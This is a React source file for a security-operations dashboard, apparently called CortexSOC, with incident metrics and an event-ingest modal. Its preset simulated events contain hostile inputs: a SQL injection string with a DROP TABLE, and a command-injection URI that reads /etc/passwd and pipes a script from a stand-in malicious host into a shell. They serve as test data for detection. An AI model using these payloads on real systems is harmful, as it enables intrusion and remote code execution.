import { useState, useCallback } from "react";
import { AgentStatus } from "./components/AgentStatus";
import { ConnectionBanner } from "./components/ConnectionBanner";
import { IncidentDetail } from "./components/IncidentDetail";
import { IncidentList } from "./components/IncidentList";
import { usePolling } from "./hooks/usePolling";
import { api } from "./api/client";
import type { IncidentSummary } from "./types/api";

const PRESET_ATTACKS = [
  {
    name: "💥 SQL Injection & Auth Bypass",
    source: "web_firewall",
    payload: JSON.stringify({
      event_type: "SQL Injection & Auth Bypass",
      attacker_ip: "185.220.101.4",
      target_path: "/api/v1/auth/login",
      payload: "' OR '1'='1' -- DROP TABLE users;",
      user_agent: "HydraSec/2.1 Automated Vulnerability Scanner",
    }),
  },
  {
    name: "🔑 SSH Password Brute-Force",
    source: "syslog_sshd",
    payload: JSON.stringify({
      event_type: "SSH Brute-Force Probing",
      attacker_ip: "194.26.29.112",
      target_port: 22,
      failed_attempts: 1420,
      user_list: ["root", "admin", "dbuser", "ubuntu"],
    }),
  },
  {
    name: "⚡ Remote Code Execution (RCE)",
    source: "nginx_access_log",
    payload: JSON.stringify({
      event_type: "Command Injection RCE",
      attacker_ip: "45.154.255.88",
      target_uri: "/cgi-bin/vulnerable.py?cmd=cat+/etc/passwd;curl+http://malicious.cc/shell.sh|sh",
      http_method: "POST",
    }),
  },
];

export default function App() {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [showIngestModal, setShowIngestModal] = useState<boolean>(false);
  const [customSource, setCustomSource] = useState<string>("custom_sensor");
  const [customPayload, setCustomPayload] = useState<string>(
    JSON.stringify({ event_type: "Unauthorized Access Probe", source_ip: "192.168.1.100" }, null, 2)
  );

  // Poll agent status & incident metrics
  const { data: agentData, error: connError } = usePolling(() => api.getAgentsStatus(), 15_000);
  const incidentsFetcher = useCallback(() => api.listIncidents(1, 50), []);
  const { data: incidentData, refresh: refreshIncidents } = usePolling(incidentsFetcher, 10_000);

  const incidents: IncidentSummary[] = incidentData?.data ?? [];
  const criticalCount = incidents.filter((i: IncidentSummary) => i.risk_score >= 80).length;
  const highCount = incidents.filter((i: IncidentSummary) => i.risk_score >= 60 && i.risk_score < 80).length;

  const rawAgents = agentData?.agents ?? {};
  const agentCount = Array.isArray(rawAgents) ? rawAgents.length : Object.keys(rawAgents).length || 8;

  const handleSimulateAttack = async () => {
    try {
      setIsSimulating(true);
      await api.triggerSimulatedAttack();
      setTimeout(() => {
        setIsSimulating(false);
        refreshIncidents();
      }, 1200);
    } catch (err) {
      console.error("Failed to trigger simulated attack:", err);
      setIsSimulating(false);
    }
  };

  const handleCustomIngest = async (source: string, payloadStr: string) => {
    try {
      setIsSimulating(true);
      await api.ingestCustomEvent(source, payloadStr);
      setShowIngestModal(false);
      setTimeout(() => {
        setIsSimulating(false);
        refreshIncidents();
      }, 1200);
    } catch (err) {
      console.error("Custom ingest failed:", err);
      setIsSimulating(false);
    }
  };

  return (
    <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", background: "var(--bg-dark)" }}>
      {/* Header */}
      <header
        style={{
          background: "rgba(13, 17, 23, 0.95)",
          borderBottom: "1px solid rgba(51, 65, 85, 0.6)",
          padding: "0.85rem 1.8rem",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: "0.8rem" }}>
          <div
            style={{
              background: "linear-gradient(135deg, var(--accent-cyan), var(--accent-purple))",
              width: "34px",
              height: "34px",
              borderRadius: "8px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontSize: "1.15rem",
              fontWeight: 800,
            }}
          >
            🛡
          </div>
          <div>
            <h1 style={{ fontSize: "1.15rem", fontWeight: 700, letterSpacing: "-0.01em", color: "#f8fafc" }}>
              CortexSOC
            </h1>
            <p style={{ fontSize: "0.7rem", color: "var(--text-muted)", letterSpacing: "0.04em", textTransform: "uppercase" }}>
              Autonomous AI Security Operating System & OTel Observability
            </p>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: "0.8rem" }}>
          <button
            onClick={() => setShowIngestModal(true)}
            style={{
              background: "rgba(6, 182, 212, 0.15)",
              border: "1px solid var(--accent-cyan)",
              color: "var(--accent-cyan)",
              padding: "0.4rem 0.9rem",
              borderRadius: "6px",
              fontSize: "0.78rem",
              fontWeight: 600,
              cursor: "pointer",
            }}
          >
            + Custom Event Ingest
          </button>
        </div>
      </header>

      {/* Connection & Telemetry Banner */}
      <ConnectionBanner
        error={connError}
        onSimulateAttack={handleSimulateAttack}
        isSimulating={isSimulating}
      />

      {/* Executive Metric Cards Strip */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
          gap: "1rem",
          padding: "1rem 1.5rem",
          borderBottom: "1px solid rgba(51, 65, 85, 0.4)",
          background: "rgba(15, 23, 42, 0.4)",
        }}
      >
        <div className="glass-panel" style={{ padding: "0.85rem 1.2rem" }}>
          <div style={{ fontSize: "0.72rem", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.05em" }}>
            Total Incidents Analyzed
          </div>
          <div style={{ fontSize: "1.5rem", fontWeight: 700, color: "var(--text-primary)", marginTop: "0.2rem" }}>
            {incidents.length}
          </div>
        </div>

        <div className="glass-panel" style={{ padding: "0.85rem 1.2rem" }}>
          <div style={{ fontSize: "0.72rem", color: "var(--accent-rose)", textTransform: "uppercase", letterSpacing: "0.05em" }}>
            Critical Threats
          </div>
          <div style={{ fontSize: "1.5rem", fontWeight: 700, color: "var(--accent-rose)", marginTop: "0.2rem" }}>
            {criticalCount}
          </div>
        </div>

        <div className="glass-panel" style={{ padding: "0.85rem 1.2rem" }}>
          <div style={{ fontSize: "0.72rem", color: "var(--accent-amber)", textTransform: "uppercase", letterSpacing: "0.05em" }}>
            High Threats
          </div>
          <div style={{ fontSize: "1.5rem", fontWeight: 700, color: "var(--accent-amber)", marginTop: "0.2rem" }}>
            {highCount}
          </div>
        </div>

        <div className="glass-panel" style={{ padding: "0.85rem 1.2rem" }}>
          <div style={{ fontSize: "0.72rem", color: "var(--accent-emerald)", textTransform: "uppercase", letterSpacing: "0.05em" }}>
            Autonomous AI Agents
          </div>
          <div style={{ fontSize: "1.5rem", fontWeight: 700, color: "var(--accent-emerald)", marginTop: "0.2rem" }}>
            {agentCount} ACTIVE
          </div>
        </div>
      </div>

      {/* Custom Event Ingest Modal */}
      {showIngestModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: "rgba(0, 0, 0, 0.75)",
            backdropFilter: "blur(6px)",
            zIndex: 999,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: "1.5rem",
          }}
        >
          <div
            className="glass-panel"
            style={{
              width: "100%",
              maxWidth: "600px",
              padding: "1.5rem",
              display: "flex",
              flexDirection: "column",
              gap: "1.2rem",
              background: "#0d1117",
              border: "1px solid var(--accent-cyan)",
            }}
          >
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h3 style={{ fontSize: "1.05rem", color: "var(--text-primary)", fontWeight: 700 }}>
                ⚡ Ingest Security Telemetry Event
              </h3>
              <button
                onClick={() => setShowIngestModal(false)}
                style={{ background: "none", border: "none", color: "var(--text-muted)", fontSize: "1.2rem", cursor: "pointer" }}
              >
                ✕
              </button>
            </div>

            <div>
              <p style={{ fontSize: "0.78rem", color: "var(--text-muted)", marginBottom: "0.6rem" }}>
                Select a Preset Threat Vector:
              </p>
              <div style={{ display: "flex", flexDirection: "column", gap: "0.5rem" }}>
                {PRESET_ATTACKS.map((preset) => (
                  <button
                    key={preset.name}
                    onClick={() => handleCustomIngest(preset.source, preset.payload)}
                    style={{
                      background: "rgba(30, 41, 59, 0.6)",
                      border: "1px solid rgba(51, 65, 85, 0.6)",
                      color: "var(--text-primary)",
                      padding: "0.6rem 0.9rem",
                      borderRadius: "6px",
                      fontSize: "0.8rem",
                      fontWeight: 600,
                      cursor: "pointer",
                      textAlign: "left",
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <span>{preset.name}</span>
                    <span style={{ fontSize: "0.7rem", color: "var(--accent-cyan)" }}>Inject & Run Pipeline →</span>
                  </button>
                ))}
              </div>
            </div>

            <div style={{ height: "1px", background: "rgba(51, 65, 85, 0.5)" }} />

            <div>
              <p style={{ fontSize: "0.78rem", color: "var(--text-muted)", marginBottom: "0.4rem" }}>
                Or Submit Custom Log Payload (JSON/Text):
              </p>
              <input
                type="text"
                placeholder="Log Source Identifier (e.g. firewall, sshd)"
                value={customSource}
                onChange={(e) => setCustomSource(e.target.value)}
                style={{
                  width: "100%",
                  background: "rgba(15, 23, 42, 0.8)",
                  border: "1px solid rgba(51, 65, 85, 0.6)",
                  color: "var(--text-primary)",
                  padding: "0.5rem",
                  borderRadius: "6px",
                  fontSize: "0.8rem",
                  marginBottom: "0.6rem",
                  outline: "none",
                }}
              />
              <textarea
                rows={5}
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                style={{
                  width: "100%",
                  background: "rgba(15, 23, 42, 0.8)",
                  border: "1px solid rgba(51, 65, 85, 0.6)",
                  color: "var(--text-primary)",
                  padding: "0.6rem",
                  borderRadius: "6px",
                  fontSize: "0.78rem",
                  fontFamily: "var(--font-mono)",
                  outline: "none",
                }}
              />
            </div>

            <div style={{ display: "flex", justifyContent: "flex-end", gap: "0.8rem" }}>
              <button
                onClick={() => setShowIngestModal(false)}
                style={{
                  background: "none",
                  border: "1px solid rgba(51, 65, 85, 0.6)",
                  color: "var(--text-muted)",
                  padding: "0.45rem 1rem",
                  borderRadius: "6px",
                  fontSize: "0.8rem",
                  cursor: "pointer",
                }}
              >
                Cancel
              </button>
              <button
                onClick={() => handleCustomIngest(customSource, customPayload)}
                style={{
                  background: "var(--accent-cyan)",
                  color: "#000",
                  border: "none",
                  padding: "0.45rem 1.2rem",
                  borderRadius: "6px",
                  fontSize: "0.8rem",
                  fontWeight: 700,
                  cursor: "pointer",
                }}
              >
                Ingest Event
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Main Workspace */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
        {/* Left Sidebar: Agents */}
        <aside style={{ width: 280, borderRight: "1px solid rgba(51, 65, 85, 0.4)", overflowY: "auto", background: "rgba(11, 15, 25, 0.5)" }}>
          <div style={{ padding: "0.8rem 1rem", fontSize: "0.72rem", color: "var(--text-muted)", textTransform: "uppercase", letterSpacing: "0.08em", fontWeight: 700, borderBottom: "1px solid rgba(51, 65, 85, 0.3)" }}>
            AI Agent Execution Matrix
          </div>
          <AgentStatus />
        </aside>

        {/* Right Content: Incidents or Detail */}
        <main style={{ flex: 1, overflow: "hidden", background: "rgba(15, 23, 42, 0.2)" }}>
          {selectedId ? (
            <IncidentDetail id={selectedId} onBack={() => setSelectedId(null)} />
          ) : (
            <IncidentList onSelect={setSelectedId} />
          )}
        </main>
      </div>
    </div>
  );
}
